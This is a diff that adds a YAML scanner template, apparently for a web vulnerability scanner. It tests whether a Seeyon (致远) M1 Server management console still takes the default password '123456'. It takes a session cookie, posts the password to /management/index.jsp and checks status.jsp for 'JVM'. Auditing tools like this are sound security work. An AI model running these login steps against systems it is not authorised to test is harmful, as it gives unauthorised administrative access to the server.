@@ -1,0 +1,29 @@
+name: 致远-M1-Server-management-默认密码
+description: >-
+  123456
+alwaysExecute: false
+matchCount: 3
+rules:
+  - method: GET
+    path: /
+    search: >-
+      JSESSIONID=(?P<cookie>[^;]+)
+    expression:
+      status: 200
+  - method: POST
+    path: /management/index.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: JSESSIONID={{cookie}} 
+    body: >-
+      password=123456
+    follow_redirects: true
+    expression:
+      status: 200
+  - method: GET
+    path: /management/status.jsp
+    headers:
+      Cookie: JSESSIONID={{cookie}} 
+    expression:
+      status: 200
+      body_all: ["JVM"]
